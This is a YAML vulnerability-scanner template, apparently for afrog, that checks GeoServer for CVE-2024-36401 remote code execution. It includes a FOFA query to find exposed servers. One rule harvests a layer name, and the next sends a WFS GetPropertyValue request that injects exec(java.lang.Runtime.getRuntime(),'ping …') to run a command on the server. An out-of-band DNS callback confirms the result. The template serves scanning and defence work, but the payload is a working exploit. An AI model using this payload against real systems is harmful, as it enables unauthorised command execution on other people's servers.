id: CVE-2024-36401

info:
  name: GeoServer wfs 远程代码执行漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    fofa: app="GeoServer"
  reference:
    - https://mp.weixin.qq.com/s/-nPGWXikcQnAdGohc9LxXQ
    - https://mp.weixin.qq.com/s/-drUjUTSIktl9-HPTWuquQ
  tags: cve,cve2024,rce,geoserver
  created: 2024/07/04

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: GET
      path: /geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage
      follow_redirects: true
    expression: true
    output:
      search: '"typeName=(?P<typename>.+?)&".bsubmatch(response.body)'
      typename: search["typename"]
  r1:
    request:
      method: GET
      path: /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames={{typename}}&valueReference=exec(java.lang.Runtime.getRuntime(),'ping {{oobDNS}}')
    expression: response.status == 400 && response.body.bcontains(b'ows:ExceptionReport') && oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0() && r1()
